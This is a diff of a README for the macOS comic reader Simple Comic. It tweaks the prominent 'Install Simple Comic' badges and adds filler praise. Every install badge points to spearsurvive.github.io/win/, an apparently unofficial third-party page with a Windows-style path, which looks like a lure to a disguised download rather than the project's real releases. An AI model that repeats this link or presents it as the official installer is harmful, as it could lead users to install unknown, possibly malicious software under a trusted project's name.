@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple%20Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple+Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,7 +30,7 @@
 
 ## 📖 About Simple Comic
 
-Simple Comic is a free, open-source macOS comic book reader supporting CBR, CBZ, PDF, and common image formats. It provides a fullscreen reading mode, double-page spread support, and keyboard navigation — a clean, native Mac comic reading experience.
+Simple Comic is a free, open-source macOS comic book reader supporting CBR, CBZ, PDF, and common image formats. It provides a fullscreen reading mode, double-page spread support, and keyboard navigation — a clean, native Mac comic reading experience without distractions. Simple Comic has been a staple in the Mac community for casual comic book readers.
 
 ---
 
@@ -81,7 +81,7 @@ Simple Comic is a free, open-source macOS comic book reader supporting CBR, CBZ,
 
 <div align="center">
 
-[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple%20Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple+Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Simple Comic is a free, open-source macOS comic book reader supporting CBR, CBZ,
 
 <div align="center">
 
-[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple%20Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Simple Comic](https://img.shields.io/badge/⬇_Install_Simple+Comic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
